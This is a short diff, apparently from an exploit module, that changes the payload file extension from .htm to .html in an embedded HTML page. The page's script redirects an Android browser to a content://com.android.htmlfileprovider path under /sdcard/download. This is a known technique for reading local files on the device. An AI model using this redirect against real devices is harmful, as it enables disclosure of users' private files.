@@ -126,8 +126,8 @@ EOS
 <html>
 <body>
 <script lang=javascript>
-setTimeout("document.location = 'content://com.android.htmlfileprovider/sdcard/download/#{payload_fn}.htm';", 5000);
-setTimeout("document.location = '#{payload_fn}.htm';", 500);
+setTimeout("document.location = 'content://com.android.htmlfileprovider/sdcard/download/#{payload_fn}.html';", 5000);
+setTimeout("document.location = '#{payload_fn}.html';", 500);
 </script>
 </body>
 </html>
